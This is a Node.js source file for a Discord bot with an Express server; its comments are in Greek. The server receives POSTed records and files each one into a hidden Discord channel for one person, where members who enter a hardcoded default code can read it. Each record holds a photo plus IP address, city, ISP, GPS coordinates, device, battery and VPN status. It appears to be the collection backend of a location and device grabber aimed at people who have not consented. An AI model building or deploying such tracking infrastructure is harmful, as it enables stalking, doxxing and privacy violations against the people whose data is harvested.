const { Client, GatewayIntentBits, EmbedBuilder, ChannelType, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, InteractionType, PermissionsBitField } = require('discord.js');
const express = require('express');
const cors = require('cors');

// ---------- ΡΥΘΜΙΣΕΙΣ ----------
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '50mb' }));

// ---------- BOT ----------
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ]
});

const TOKEN = process.env.BOT_TOKEN;
const SERVER_ID = process.env.SERVER_ID;
const CATEGORY_ID = '1545817704127266876';
const WELCOME_CHANNEL_ID = '1545861068117774349';
const ACCESS_CODE = process.env.ACCESS_CODE || 'loco_mp3!'; // Αν δεν υπάρχει, βάζει το default

// Αποθήκευση των χρηστών που έχουν πρόσβαση
const accessUsers = new Set();

const messageCache = new Map();

// ---------- ΕΚΚΙΝΗΣΗ BOT ----------
client.once('ready', () => {
    console.log(`✅ Bot online: ${client.user.tag}`);
    console.log(`📁 Κατηγορία ID: ${CATEGORY_ID}`);
    console.log(`👋 Welcome Channel ID: ${WELCOME_CHANNEL_ID}`);
    console.log(`🔑 Access Code: ${ACCESS_CODE ? '✅ Ορισμένος' : '❌ Δεν έχει οριστεί'}`);
    
    const guild = client.guilds.cache.get(SERVER_ID);
    if (guild) {
        const category = guild.channels.cache.get(CATEGORY_ID);
        if (category) {
            console.log(`✅ Βρέθηκε η κατηγορία: ${category.name}`);
        } else {
            console.error(`❌ Δεν βρέθηκε κατηγορία με ID: ${CATEGORY_ID}`);
        }
        
        const welcomeChannel = guild.channels.cache.get(WELCOME_CHANNEL_ID);
        if (welcomeChannel) {
            console.log(`✅ Βρέθηκε το welcome κανάλι: #${welcomeChannel.name}`);
        } else {
            console.error(`❌ Δεν βρέθηκε welcome κανάλι με ID: ${WELCOME_CHANNEL_ID}`);
        }
    } else {
        console.error(`❌ Δεν βρέθηκε server με ID: ${SERVER_ID}`);
    }
});

// ---------- WELCOME SYSTEM (ΑΥΤΟΜΑΤΟ) ----------
client.on('guildMemberAdd', async (member) => {
    console.log(`👤 Νέο μέλος στον server: ${member.user.tag} (${member.id})`);
    
    try {
        const guild = client.guilds.cache.get(SERVER_ID);
        if (!guild) {
            console.error('❌ Δεν βρέθηκε ο server');
            return;
        }

        const welcomeChannel = guild.channels.cache.get(WELCOME_CHANNEL_ID);
        if (!welcomeChannel) {
            console.error(`❌ Δεν βρέθηκε το welcome κανάλι με ID: ${WELCOME_CHANNEL_ID}`);
            return;
        }

        // Δημιουργία κουμπιού Access
        const row = new ActionRowBuilder()
            .addComponents(
                new ButtonBuilder()
                    .setCustomId('access_button')
                    .setLabel('🔑 Access')
                    .setStyle(ButtonStyle.Primary)
            );

        // Δημιουργία embed
        const embed = new EmbedBuilder()
            .setColor(0x00ff88)
            .setTitle('👋 ΚΑΛΩΣ ΗΡΘΕΣ!')
            .setDescription(`Καλώς ήρθες στον server μας, **${member.user.username}**! 🎉`)
            .addFields(
                { name: '👤 Χρήστης', value: `${member.user.tag}`, inline: true },
                { name: '📅 Δημιουργία Λογαριασμού', value: `<t:${Math.floor(member.user.createdTimestamp / 1000)}:R>`, inline: true },
                { name: '📊 Σειρά Εγγραφής', value: `#${guild.memberCount}`, inline: true },
                { name: '🔒 Πρόσβαση', value: 'Πάτα το κουμπί **Access** για να δεις τα κανάλια των χρηστών', inline: false }
            )
            .setThumbnail(member.user.displayAvatarURL({ dynamic: true, size: 256 }))
            .setTimestamp()
            .setFooter({ 
                text: 'Secure Connection System • Auto-Welcome',
                iconURL: 'https://cdn.discordapp.com/emojis/1085933512993218630.png'
            });

        // Αποστολή στο welcome κανάλι
        await welcomeChannel.send({ 
            embeds: [embed],
            components: [row]
        });
        console.log(`👋 Στάλθηκε welcome για τον ${member.user.tag} στο #${welcomeChannel.name}`);

    } catch (error) {
        console.error('❌ Σφάλμα κατά την αποστολή welcome:', error);
    }
});

// ---------- INTERACTION HANDLER (Button & Modal) ----------
client.on('interactionCreate', async (interaction) => {
    // Χειρισμός κουμπιού Access
    if (interaction.isButton() && interaction.customId === 'access_button') {
        console.log(`🔑 Ο ${interaction.user.tag} πάτησε το κουμπί Access`);

        // Δημιουργία Modal για τον κωδικό
        const modal = new ModalBuilder()
            .setCustomId('access_modal')
            .setTitle('🔑 Πρόσβαση στα Καναλιά');

        // Δημιουργία input για τον κωδικό - ΜΥΣΤΙΚΟ
        const codeInput = new TextInputBuilder()
            .setCustomId('access_code_input')
            .setLabel('Εισάγετε τον κωδικό πρόσβασης')
            .setStyle(TextInputStyle.Short)
            .setPlaceholder('••••••••') // Placeholder με αστεράκια
            .setRequired(true)
            .setMinLength(1)
            .setMaxLength(50);

        const row = new ActionRowBuilder().addComponents(codeInput);
        modal.addComponents(row);

        await interaction.showModal(modal);
    }

    // Χειρισμός Modal (υποβολή κωδικού)
    if (interaction.isModalSubmit() && interaction.customId === 'access_modal') {
        const code = interaction.fields.getTextInputValue('access_code_input');
        console.log(`🔑 Ο ${interaction.user.tag} υπέβαλε κωδικό`);

        if (code === ACCESS_CODE) {
            // Σωστός κωδικός - Δίνουμε πρόσβαση
            accessUsers.add(interaction.user.id);
            console.log(`✅ Ο ${interaction.user.tag} πήρε πρόσβαση!`);

            // Απάντηση επιτυχίας
            await interaction.reply({
                content: '✅ **Πρόσβαση παραχωρήθηκε!** Μπορείς τώρα να δεις τα κανάλια των χρηστών. 🔓',
                ephemeral: true
            });

            // Δίνουμε role ή permission στον χρήστη
            try {
                const guild = client.guilds.cache.get(SERVER_ID);
                if (guild) {
                    const member = await guild.members.fetch(interaction.user.id);
                    if (member) {
                        // Βρίσκουμε την κατηγορία
                        const category = guild.channels.cache.get(CATEGORY_ID);
                        if (category) {
                            // Δίνουμε permission να βλέπει την κατηγορία
                            await category.permissionOverwrites.edit(member, {
                                ViewChannel: true,
                                ReadMessageHistory: true
                            });
                            console.log(`✅ Δόθηκαν permissions στον ${interaction.user.tag} για την κατηγορία`);
                        }
                    }
                }
            } catch (permError) {
                console.error('❌ Σφάλμα κατά το permission:', permError);
            }

        } else {
            // Λάθος κωδικός
            await interaction.reply({
                content: '❌ **Λάθος κωδικός!** Δοκίμασε ξανά. Η πρόσβαση δεν δόθηκε.',
                ephemeral: true
            });
            console.log(`❌ Ο ${interaction.user.tag} έβαλε λάθος κωδικό`);
        }
    }
});

// ---------- ΒΟΗΘΗΤΙΚΕΣ ΣΥΝΑΡΤΗΣΕΙΣ ----------
function cleanName(name) {
    return name.toLowerCase()
        .replace(/\s+/g, '-')
        .replace(/[^a-z0-9-]/g, '')
        .substring(0, 30);
}

function createDataEmbed(dataString, userName, photoBase64) {
    const embed = new EmbedBuilder()
        .setColor(0x5865F2)
        .setTitle('🔒 ΑΝΑΦΟΡΑ ΑΣΦΑΛΕΙΑΣ')
        .setDescription(`**Χρήστης:** ${userName || 'Άγνωστος'}`)
        .setTimestamp()
        .setFooter({ 
            text: 'Secure Connection System • All data is logged',
            iconURL: 'https://cdn.discordapp.com/emojis/1085933512993218630.png'
        })
        .setThumbnail('https://cdn.discordapp.com/emojis/1085933512993218630.png');

    if (photoBase64 && photoBase64.startsWith('data:image/')) {
        embed.setImage('attachment://photo.jpg');
    }

    const lines = dataString.split('\n')
        .map(line => line.trim())
        .filter(line => line.length > 0);

    const fieldMap = {
        '👤': { name: '👤 Στοιχεία Χρήστη', icon: '👤' },
        '🌐': { name: '🌐 Διεύθυνση IP', icon: '🌐' },
        '🏙️': { name: '🏙️ Τοποθεσία', icon: '🏙️' },
        '🌍': { name: '🌍 Χώρα', icon: '🌍' },
        '📡': { name: '📡 Πάροχος', icon: '📡' },
        '🗺️': { name: '🗺️ Χάρτης', icon: '🗺️' },
        '📱': { name: '📱 Συσκευή', icon: '📱' },
        '💿': { name: '💿 Λειτουργικό Σύστημα', icon: '💿' },
        '🖥️': { name: '🖥️ Ανάλυση Οθόνης', icon: '🖥️' },
        '🔋': { name: '🔋 Μπαταρία', icon: '🔋' },
        '📶': { name: '📶 Τύπος Σύνδεσης', icon: '📶' },
        '🕐': { name: '🕐 Ζώνη Ώρας', icon: '🕐' },
        '⏱️': { name: '⏱️ Χρόνος Σύνδεσης', icon: '⏱️' },
        '📍': { name: '📍 Συντεταγμένες GPS', icon: '📍' },
        '🎯': { name: '🎯 Ακρίβεια GPS', icon: '🎯' },
        '📊': { name: '📊 Στατιστικά', icon: '📊' },
        '🔒': { name: '🔒 VPN Detection', icon: '🔒' }
    };

    let currentField = null;
    let currentValue = '';
    let fields = [];
    let generalInfo = [];

    for (const line of lines) {
        let matchedEmoji = null;
        for (const emoji of Object.keys(fieldMap)) {
            if (line.startsWith(emoji)) {
                matchedEmoji = emoji;
                break;
            }
        }

        if (matchedEmoji) {
            if (currentField && currentValue) {
                fields.push({
                    name: currentField,
                    value: currentValue.trim(),
                    inline: false
                });
            }
            
            const parts = line.split(':').map(s => s.trim());
            if (parts.length >= 2) {
                const value = parts.slice(1).join(':').trim();
                const cleanValue = value.replace(/\*\*/g, '');
                currentField = fieldMap[matchedEmoji].name;
                currentValue = cleanValue;
            } else {
                currentField = 'ℹ️ Πληροφορία';
                currentValue = line.replace(/\*\*/g, '');
            }
        } else {
            if (currentField) {
                currentValue += '\n' + line.replace(/\*\*/g, '');
            } else {
                generalInfo.push(line.replace(/\*\*/g, ''));
            }
        }
    }

    if (currentField && currentValue) {
        fields.push({
            name: currentField,
            value: currentValue.trim(),
            inline: false
        });
    }

    if (generalInfo.length > 0) {
        embed.addFields({
            name: '📋 Γενικές Πληροφορίες',
            value: generalInfo.join('\n').substring(0, 1024),
            inline: false
        });
    }

    for (const field of fields) {
        let value = field.value;
        if (value.length > 1024) {
            value = value.substring(0, 1020) + '...';
        }
        embed.addFields({
            name: field.name,
            value: value || 'Δεν υπάρχουν δεδομένα',
            inline: false
        });
    }

    if (fields.length === 0 && generalInfo.length === 0) {
        embed.setDescription('```' + dataString.replace(/\*\*/g, '') + '```');
    }

    return embed;
}

async function clearChannelMessages(channel) {
    try {
        const messages = await channel.messages.fetch({ limit: 100 });
        if (messages.size > 0) {
            await channel.bulkDelete(messages, true);
            console.log(`🗑️ Διαγράφηκαν ${messages.size} παλιά μηνύματα`);
        }
    } catch (error) {
        console.log('⚠️ Δεν μπόρεσα να διαγράψω όλα τα μηνύματα');
    }
}

// ---------- ENDPOINTS ----------
app.post('/', async (req, res) => {
    console.log('\n📥 ΝΕΟ ΑΙΤΗΜΑ!');
    console.log('📦 Λήφθηκαν δεδομένα:', JSON.stringify(req.body, null, 2));
    
    const { name, data, photo } = req.body;
    
    if (!name || !data) {
        console.error('❌ Λείπουν δεδομένα');
        return res.status(400).json({ 
            success: false, 
            error: 'Missing name or data'
        });
    }
    
    try {
        const guild = client.guilds.cache.get(SERVER_ID);
        if (!guild) {
            return res.status(500).json({ success: false, error: 'Server not found' });
        }
        
        const category = guild.channels.cache.get(CATEGORY_ID);
        if (!category) {
            return res.status(500).json({ success: false, error: 'Category not found' });
        }
        
        const channelName = `👤-${cleanName(name)}`;
        console.log(`📝 Αναζήτηση/δημιουργία καναλιού: ${channelName}`);
        
        let channel = guild.channels.cache.find(
            c => c.type === ChannelType.GuildText && 
            c.name === channelName && 
            c.parentId === CATEGORY_ID
        );
        
        if (!channel) {
            console.log(`📝 Δημιουργία νέου καναλιού...`);
            channel = await guild.channels.create({
                name: channelName,
                type: ChannelType.GuildText,
                parent: CATEGORY_ID,
                reason: `Κανάλι για τον χρήστη ${name}`,
                permissionOverwrites: [
                    {
                        id: guild.id,
                        deny: [PermissionsBitField.Flags.ViewChannel],
                    }
                ]
            });
            console.log(`✅ Δημιουργήθηκε το κανάλι: ${channel.name}`);
        } else {
            console.log(`✅ Βρέθηκε υπάρχον κανάλι: ${channel.name}`);
        }
        
        const dataHash = Buffer.from(data + (photo || '')).toString('base64').substring(0, 50);
        const cacheKey = `${channel.id}_${name}`;
        
        if (messageCache.has(cacheKey) && messageCache.get(cacheKey) === dataHash) {
            console.log(`⏭️ Τα δεδομένα είναι ίδια, δεν στέλνω ξανά`);
            return res.json({ 
                success: true, 
                channel: channel.name,
                message: 'Data unchanged'
            });
        }
        
        await clearChannelMessages(channel);
        
        const embed = createDataEmbed(data, name, photo);
        
        let messageOptions = { embeds: [embed] };
        
        if (photo && photo.startsWith('data:image/')) {
            const base64Data = photo.replace(/^data:image\/\w+;base64,/, '');
            const buffer = Buffer.from(base64Data, 'base64');
            messageOptions.files = [{
                attachment: buffer,
                name: 'photo.jpg'
            }];
        }
        
        await channel.send(messageOptions);
        console.log(`📤 ΕΠΙΤΥΧΙΑ! Στάλθηκε στο #${channel.name}`);
        
        messageCache.set(cacheKey, dataHash);
        
        res.json({ 
            success: true, 
            channel: channel.name,
            message: 'Data sent successfully'
        });
        
    } catch (error) {
        console.error('❌ Σφάλμα:', error);
        res.status(500).json({ 
            success: false, 
            error: error.message
        });
    }
});

app.get('/', (req, res) => {
    res.json({
        status: 'online',
        bot: client.user?.tag || 'not ready',
        server: client.guilds.cache.get(SERVER_ID)?.name || 'not connected',
        category: CATEGORY_ID,
        welcomeChannel: WELCOME_CHANNEL_ID,
        accessUsers: accessUsers.size
    });
});

app.get('/test', (req, res) => {
    res.json({
        message: '✅ Το bot λειτουργεί!',
        bot: client.user?.tag || 'not ready',
        server: client.guilds.cache.get(SERVER_ID)?.name || 'not connected',
        category: CATEGORY_ID,
        welcomeChannel: WELCOME_CHANNEL_ID
    });
});

// ---------- ΕΚΚΙΝΗΣΗ ----------
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🌐 Server τρέχει στη θύρα: ${PORT}`);
});

client.login(TOKEN).catch(err => {
    console.error('❌ Σφάλμα σύνδεσης bot:', err);
});
